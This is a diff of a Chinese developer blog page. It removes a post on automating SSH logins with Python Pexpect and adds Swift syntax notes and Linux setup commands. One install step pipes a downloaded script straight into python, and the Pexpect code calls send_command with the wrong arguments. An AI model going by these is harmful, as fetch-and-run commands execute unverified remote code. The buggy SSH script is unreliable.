-	</article>
- 
-	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
-		<div class="meta">
-			<div class="date">
-				<time datetime="2016-06-24T19:11:42+08:00" itemprop="datePublished">2016/6/24</time>
-			</div>
-			<div class="tags">posted in 
-			
-			    <a class='category' href='python.html'>Python</a>&nbsp;
-			 
-			</div>
-		</div>
-		<h1 class="title" itemprop="name"><a href="14945011027951.html" itemprop="url">
-		Python利用Pexpect模拟ssh交互</a></h1>
-		<div class="entry-content" itemprop="articleBody">
-			
-			<blockquote>
-<p><mark>关于Pexpect</mark><br/>
-Pexpect 是 Don Libes 的 Expect 语言的一个 Python 实现，是一个用来启动子程序，并使用正则表达式对程序输出做出特定响应，以此实现与其自动交互的 Python 模块。 Pexpect 的使用范围很广，可以用来实现与 ssh、ftp 、telnet 等程序的自动交互；可以用来自动复制软件安装包并在不同机器自动安装；还可以用来实现软件测试中与命令行交互的自动化。</p>
-</blockquote>
-
-<h5 id="toc_0">本文利用到的Pexpect的类和方法</h5>
-
-<ol>
-<li><p><code>spawn()</code>类:</p>
-
-<pre><code class="language-Python">class spawn:
-    def __init__(self,command,args=[],timeout=30,maxread=2000,\
-    searchwindowsize=None, logfile=None, cwd=None, env=None)
-</code></pre>
-
-<p>spawn是Pexpect模块主要的类，用以实现启动子程序，它有丰富的方法与子程序交互从而实现用户对子程序的控制。它主要使用 pty.fork() 生成子进程，并调用 exec() 系列函数执行 command 参数的内容。</p></li>
-<li><p><code>spawn()</code>类中的<code>expect()</code>函数:</p>
-
-<pre><code class="language-Python">expect(self, pattern, timeout=-1, searchwindowsize=None)
-</code></pre>
-
-<p>在参数中： pattern 可以是正则表达式， pexpect.EOF ， pexpect.TIMEOUT ，或者由这些元素组成的列表。需要注意的是，当 pattern 的类型是一个列表时，且子程序输出结果中不止一个被匹配成功，则匹配返回的结果是缓冲区中最先出现的那个元素，或者是列表中最左边的元素。使用 timeout 可以指定等待结果的超时时间 ，该时间以秒为单位。当超过预订时间时， expect 匹配到pexpect.TIMEOUT。</p></li>
-<li><p><code>spawn()</code>类中的<code>before</code>和<code>after</code>属性:</p>
-
-<p>expect 不断从读入缓冲区中匹配目标正则表达式，当匹配结束时 pexpect 的 before 成员中保存了缓冲区中匹配成功处之前的内容， pexpect 的 after 成员保存的是缓冲区中与目标正则表达式相匹配的内容。</p>
-
-<pre><code class="language-Python">child = pexpect.spawn(&#39;/bin/ls /&#39;) 
-child.expect (pexpect.EOF) 
-print child.before
-</code></pre>
-
-<p>以上代码就是打印在根目录下面执行ls命令后的输出内容</p></li>
-<li><p><code>spawn()</code>类中的send系列函数:</p>
-
-<pre><code class="language-Python">send(self, s) 
-sendline(self, s=&#39;&#39;) 
-sendcontrol(self, char)
-</code></pre>
-
-<p>这些方法用来向子程序发送命令，模拟输入命令的行为。 与 send() 不同的是 sendline() 会额外输入一个回车符 ，更加适合用来模拟对子程序进行输入命令的操作。 当需要模拟发送 “Ctrl+c” 的行为时，还可以使用 sendcontrol() 发送控制字符。</p>
-
-<pre><code class="language-Python">child.sendcontrol(&#39;c&#39;)
-
-</code></pre></li>
-</ol>
-
-<h5 id="toc_1">功能模块分解</h5>
-
-<ol>
-<li><p>首先我们需要一个可以单独的session会话，可以由connect函数创建指定host,username和password的会话子进程</p>
-
-<pre><code>```Python
-PROMPT = [&#39;#&#39;,&#39;$&#39;,&#39;&gt;&#39;,&#39;\$&#39;,&#39;&gt;&gt;&gt;&#39;]
-def createChildSession(host,username,password):
-    command = &#39;ssh &#39;+username+&#39;@&#39;+host
-    child = pexpect.spawn(command)
-    ret = child.expect([pexpect.TIMEOUT,&#39;Are you sure you want to continue connecting&#39;,&#39;[P|p]assword&#39;]+PROMPT)
-    if ret == 0:
-        print(&#39;[-] Error Connecting&#39;)
-        return
-    if ret == 1:
-        child.sendline(&#39;yes&#39;)
-        ret = child.expect([pexpect.TIMEOUT,&#39;[p|P]assword&#39;])
-        if ret == 0:
-            print(&#39;[-] Error Connecting&#39;)
-            return
-        if ret == 1:
-            send_command(password)
-            return
-    if ret == 2:
-        send_command(password)
-        return
-    return child
-```
-利用spawn创建会话之后,利用expect匹配可能存在的返回结果,如果匹配&#39;Are you sure you want to continue connecting&#39; 说明需要确认认证信息，如果直接返回password或者Password`这里利用[p|P]assword正则来匹配`,说明需要输入密码,如果直接是PROMPT中存在的字符，说明直接登录上去了。
-</code></pre></li>
-<li><p>一个单独的执行命令的函数:</p>
-
-<pre><code class="language-Python">def send_command(child,cmd):
-    child.sendline(cmd)
-    child.expect(PROMPT)
-    print(child.before)
-</code></pre>
-
-<p>一旦通过验证,我们就可以用上面的command函数在ssh会话中发送命令，然后等待命令提示符的出现，最后将命令的执行结果通过child.before打印出来。</p></li>
-<li><p>一个包含参数解析的main函数:</p>
-
-<pre><code class="language-Python">def main():
-    parse = optparse.OptionParser(&#39;Usage %prog -H &lt;host&gt; -u &lt;username&gt; -p &lt;password&gt; -c &lt;command&gt;&#39;)
-    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify the host&#39;)
-    parse.add_option(&#39;-u&#39;,dest=&#39;username&#39;,type=&#39;string&#39;,help=&#39;specify the username&#39;)
-    parse.add_option(&#39;-p&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify the password&#39;)    
-    parse.add_option(&#39;-c&#39;,dest=&#39;command&#39;,type=&#39;string&#39;,help=&#39;specify the command&#39;)
-
-    (options,args)=parse.parse_args()
-    host = options.host
-    username = options.username
-    password = options.password
-    command = options.command
-
-    session = createChildSession(host,username,password)
-    send_command(session,command)
-</code></pre>
-
-<p>optparse是一个用来给你的代码添加各种命令参数的库，用其解析出输入的host,username,password已经command,然后调用创建session会话，最后利用send_command向此session发送命令</p></li>
-</ol>
-
-<pre><code class="language-Bash">tianxianggendeiMac:Python-Study Apple$ python ssh.py -H pi.****.com -u root -p ***** -c pwd
+<li><p>Swift类型间不会隐式转换，必须要显式转换。将值转换成字符串除了使用String()显式转换外，还有中简单的方法,如下:</p>
+
+<pre><code class="language-Swift">let apples = 3
+let oranges = 5
+let appleSummary = &quot;I have \(apples) apples.&quot;
+let fruitSummary = &quot;I have \(apples + oranges)  pieces of fruit.&quot;
 </code></pre>
 
 <p>输出:</p>
 
-<pre><code class="language-Bash"> pwd
-/root
-root@raspberrypi:~
+<pre><code>&quot;I have 3 apples&quot;
+&quot;I have 8 pieces of fruit&quot;
+</code></pre></li>
+<li><p>Swift声明数组或者字典可以声明指定类型</p>
+
+<pre><code class="language-Swift">let emptyArray = [String]()
+let emptyDictionary = [String: Float]()
+</code></pre></li>
+<li><p>if语句中，条件必须是一个布尔表达式,如下:</p>
+
+<pre><code class="language-Swift"> if score &gt; 50 {
+    teamScore += 3
+} else {
+       teamScore += 1
+}
 </code></pre>
 
-<h5 id="toc_2">完整代码</h5>
+<p><code>if 1 {}</code> 这样代码会报错，但是<code>if true{}</code>这样的代码是可  以的。</p></li>
+<li><p>Switch 支持任意类型的数据以及各种比较，不仅仅限于整数以及判断是否相等,而且Switch匹配到相应的子句之后就会推出整个Switch,不需要给每个Switch子句写上break了。</p>
 
-<pre><code class="language-Python">#!/usr/bin/python
-#-*-coding:utf-8-*-
-# date:2016-6-21
-# author:root
-# 利用pexpect模拟ssh登陆
+<pre><code class="language-Swift">let vegetable = &quot;red pepper&quot;
+switch vegetable {
+case &quot;celery&quot;:
+    print(&quot;Add some raisins and make ants on a  log.&quot;)
+case &quot;cucumber&quot;, &quot;watercress&quot;:
+    print(&quot;That would make a good tea sandwich.&quot;)
+case let x where x.hasSuffix(&quot;pepper&quot;):
+    print(&quot;Is it a spicy \(x)?&quot;)
+default:
+    print(&quot;Everything tastes good in soup.&quot;)
+}
+</code></pre>
 
-import pexpect
-import optparse
+<p><em>Swift 子句中必须要遍历所有可能，否则会报错</em><br/>
+<em>上述代码中的lex表达式将匹配等式的值赋给变量x</em></p></li>
+<li><p>do{}while()被repeat{}while()取代</p>
 
-PROMPT = [&#39;#&#39;,&#39;$&#39;,&#39;&gt;&#39;,&#39;\$&#39;,&#39;&gt;&gt;&gt;&#39;]
+<pre><code class="language-Swift">var m = 2
+repeat {
+    m = m * 2
+} while m &lt; 100
+print(m)
+</code></pre></li>
+<li><p>循环有更简便的写法,0..&lt;4表示遍历0到4(不包含4，包含4用0...4),传统写法也是支持的。</p>
 
-def send_command(child,cmd):
-    child.sendline(cmd)
-    child.expect(PROMPT)
-    print(child.before)
+<pre><code class="language-Swift">var firstForLoop = 0
+for i in 0..&lt;4 {
+    firstForLoop += i
+}
+print(firstForLoop)
 
-def createChildSession(host,username,password):
-    command = &#39;ssh &#39;+username+&#39;@&#39;+host
-    child = pexpect.spawn(command)
-    ret = child.expect([pexpect.TIMEOUT,&#39;Are you sure you want to continue connecting&#39;,&#39;[P|p]assword&#39;]+PROMPT)
-    if ret == 0:
-        print(&#39;[-] Error Connecting&#39;)
-        return
-    if ret == 1:
-        child.sendline(&#39;yes&#39;)
-        ret = child.expect([pexpect.TIMEOUT,&#39;[p|P]assword&#39;])
-        if ret == 0:
-            print(&#39;[-] Error Connecting&#39;)
-            return
-        if ret == 1:
-            send_command(password)
-            return
-    if ret == 2:
-        send_command(password)
-        return
-    return child
+var firstForLoop = 0
+for i in 0...4 {
+    firstForLoop += i
+}
+print(firstForLoop)
+</code></pre></li>
+<li><p>函数可以传入可变的参数，参数在函数内表现为数组形式:<br/>
+<code>Swift<br/>
+func sumOf(numbers: Int...) -&gt; Int {<br/>
+var sum = 0<br/>
+for number in numbers {<br/>
+    sum += number<br/>
+}<br/>
+return sum<br/>
+}<br/>
+sumOf()<br/>
+sumOf(42, 597, 12)<br/>
+</code></p></li>
+<li><p>函数可以作为另一个函数的返回值，类似于OC中的block</p>
 
-def main():
-    parse = optparse.OptionParser(&#39;Usage %prog -H &lt;host&gt; -u &lt;username&gt; -p &lt;password&gt; -c &lt;command&gt;&#39;)
-    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify the host&#39;)
-    parse.add_option(&#39;-u&#39;,dest=&#39;username&#39;,type=&#39;string&#39;,help=&#39;specify the username&#39;)
-    parse.add_option(&#39;-p&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify the password&#39;)    
-    parse.add_option(&#39;-c&#39;,dest=&#39;command&#39;,type=&#39;string&#39;,help=&#39;specify the command&#39;)
+<pre><code class="language-Swift">func makeIncrementer() -&gt; (Int -&gt; Int) {
+func addOne(number: Int) -&gt; Int {
+    return 1 + number
+}
+return addOne
+}
+var increment = makeIncrementer()
+increment(7)
+</code></pre>
 
-    (options,args)=parse.parse_args()
-    host = options.host
-    username = options.username
-    password = options.password
-    command = options.command
-    
-    session = createChildSession(host,username,password)
-    send_command(session,command)
+<p>同理，函数也可以当做参数传入函数,</p>
 
-if __name__ == &#39;__main__&#39;:
-    main()
+<pre><code class="language-Swift">func hasAnyMatches(list: [Int], condition: Int -&gt;   Bool) -&gt; Bool {
+for item in list {
+    if condition(item) {
+        return true
+    }
+}
+return false
+}
+func lessThanTen(number: Int) -&gt; Bool {
+    return number &lt; 10
+}
+var numbers = [20, 19, 7, 12]
+hasAnyMatches(numbers, condition: lessThanTen)
+</code></pre></li>
+<li><p>子类中，如果需要重写父类的方法，需要使用override标记</p>
+
+<pre><code class="language-Swift">class NamedShape {
+var numberOfSides: Int = 0
+var name: String
+
+init(name: String) {
+    self.name = name
+}
+
+func simpleDescription() -&gt; String {
+        return &quot;A shape with \(numberOfSides) sides.&quot;
+  }
+}
+
+class Square: NamedShape {
+var sideLength: Double
+
+init(sideLength: Double, name: String) {
+    self.sideLength = sideLength
+    super.init(name: name)
+    numberOfSides = 4
+}
+
+func area() -&gt;  Double {
+    return sideLength * sideLength
+}
+
+override func simpleDescription() -&gt; String {
+        return &quot;A square with sides of length \(sideLength).&quot;
+    }
+}
+let test = Square(sideLength: 5.2, name: &quot;my test   square&quot;)
+test.area()
+test.simpleDescription()
+</code></pre></li>
+</ol>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2016-10-11T18:15:10+08:00" itemprop="datePublished">2016/10/11</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='ios.html'>iOS</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="14944977101213.html" itemprop="url">
+		Swift学习要点-基础部分</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p><img src="https://pic.mylonly.com/2016-06-29_15:09:33.jpg" alt="2016-06-29_15:09:33.jpg"/></p>
+
+<blockquote>
+<p>这一系列的文章都是我本人在学习Swift语法过程中认为需要注意的语法部分，所以介绍的并不会很完整。</p>
+</blockquote>
+
+<ol>
+<li><p>print函数:<code>print(_:separator:terminator:)</code>,默认情况下print会以换行符当做结束符，此外你可以通过terminator参数更改结束符，例如:</p>
+
+<pre><code class="language-Swift">print(&quot;正常的print结尾时换行符&quot;)                  //输出:正常的print结尾时换行符\n
+print(&quot;没有换行符的print&quot;,terminator:&quot;&quot;)         //输出:没有换行符的print
+print(&quot;稀奇古怪的结束符都可以&quot;,terminator:&quot;(^^)&quot;)  //输出:稀奇古怪的结束符都可以(^^)
+</code></pre></li>
+<li><p>数值类字面量，包括整数和浮点数可以添加额外的零并且包含下划线，并不会影响字面量的值</p>
+
+<pre><code class="language-Swift">let paddedDouble = 000123.456
+let oneMillion = 1_000_000
+let justOverOneMillion = 1_000_000.000_000_1
+</code></pre></li>
+<li><p>可以通过<code>typealias</code>关键字来定义类型的别名</p>
+
+<pre><code class="language-Swift">typealias AudioSample = UInt16
+var maxAmplitudeFound = AudioSample.min // maxAmplitudeFound 现在是 0
+</code></pre></li>
+<li><p>不同的数据类型之间不会隐式转换,必须要用类型名加上括号的方式进入显示转换,其中显示转换成字符串除了使用String()之外，还可以直接在字符串中适用(其他类型值)来转换</p>
+
+<pre><code class="language-Swift">var maxValue = UInt8.max
+var max64Value = Int64.max
+
+max64Value = maxValue  //Error:Cannot assign value of type &#39;UInt8&#39; to type &#39;Int64&#39;
+max64Value = Int64(maxValue) //Ok
+
+let number = 3
+var str1 = String(number) //str1 = &quot;3&quot;
+var str2 = &quot;\(number)&quot;    //str2 = &quot;3&quot; 
+</code></pre></li>
+<li><p>如果你只需要一部分元组值，分解的时候可以把要忽略的部分用下划线（_）标记：</p>
+
+<pre><code class="language-Swift">let http404Error = (404, &quot;Not Found&quot;)  // http404Error 的类型是 (Int, String)，值是 (404, &quot;Not Found&quot;)
+let (justTheStatusCode, _) = http404Error
+print(&quot;The status code is \(justTheStatusCode)&quot;) // 输出 &quot;The status code is 404&quot;
+</code></pre></li>
+<li><p>Swift 的<code>nil</code>和 Objective-C 中的<code>nil</code>并不一样。在 Objective-C 中，<code>nil</code>是一个指向不存在对象的指针。在 Swift 中，<code>nil</code>不是指针——它是一个确定的值，用来表示值缺失。任何类型的可选状态都可以被设置为<code>nil</code>，不只是对象类型。</p>
+
+<pre><code class="language-Swift">var serverResponseCode: Int? = 404
+// serverResponseCode 包含一个可选的 Int 值 404
+serverResponseCode = nil
+// serverResponseCode 现在不包含值
+</code></pre></li>
+<li><p>使用!来强制解析值之前，一定要确定可选包含一个非nil的值，否则当强制解析一个nil值时会报错。</p>
+
+<pre><code class="language-Swift">var option:Int?    //没有初始值的可选类型变量默认值为nil
+var str = &quot;\(option)&quot; //输出:&quot;nil&quot;
+str = &quot;\(option!)&quot;    //Error
+</code></pre></li>
+<li><p>常量的值一旦被确定就不能修改，但是用let声明常量时可以不必紧跟其后为其设置初始值。</p>
+
+<pre><code class="language-Swift">let const_a:String
+if (condition){
+    const_a = &quot;a&quot;
+}else{
+    const_a = &quot;b&quot;
+}
+</code></pre></li>
+</ol>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2016-09-11T19:10:48+08:00" itemprop="datePublished">2016/9/11</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='linux.html'>Linux</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="14945010480752.html" itemprop="url">
+		各种程序的安装</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<ol>
+<li>源码安装nginx</li>
+</ol>
+
+<pre><code>#安装编译nginx必须的依赖
+yum install gcc-c++
+yum install pcre pcre-devel  
+yum install zlib zlib-devel 
+yum install openssl openssl--devel
+
+#下载nginx源码
+wget http://nginx.org/download/nginx-1.9.15.tar.gz
+
+#解压
+tar -zvxf nginx-1.9.15.tar.gz -C ../document/
+
+#编译安装
+cd ../document/nginx-1.9.15
+./configure
+make
+make install
+</code></pre>
+
+<ol>
+<li>setuptools 安装</li>
+</ol>
+
+<pre><code>wget https://bootstrap.pypa.io/ez_setup.py -O - | python
+
+</code></pre>
+
+<ol>
+<li>pip源码安装</li>
+</ol>
+
+<pre><code>[pip官网安装](https://pypi.python.org/pypi/pip)
+</code></pre>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2016-09-11T18:16:48+08:00" itemprop="datePublished">2016/9/11</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='linux.html'>Linux</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="14944978089747.html" itemprop="url">
+		Linux常用命令</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<ol>
+<li>磁盘挂载</li>
+</ol>
+
+<pre><code>fdisk -l #查看磁盘信息
+mount /dev/xvdb1 /mnt #挂载磁盘
+</code></pre>
+
+<ol>
+<li>设置开机自动加载磁盘</li>
+</ol>
+
+<pre><code>vim /etc/fstab
+写入 /dev/xvdb1 /mnt ext4 default 1 1
+</code></pre>
+
+<ol>
+<li>修改主机名</li>
+</ol>
+
+<pre><code>vim /etc/sysconfig/network #修改里面的HOSTNAME值
+</code></pre>
+
+<ol>
+<li>设置ssh自动认证</li>
+</ol>
+
+<pre><code>ssh-keygen -t rsa #在客户机生成秘钥，
+scp ~/.ssh/id_rsa.pub root@xxx.com:/home/xxx/ #将客户端生成的公钥文件发送到服务器上
+#将id_rsa.pub文件写入服务器的.ssh/authorized_keys中，
+最好用cat命令写入,手动创建authorized_keys文件会出现各种各样的权限认证问题
+cat id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys
 </code></pre>
 
 
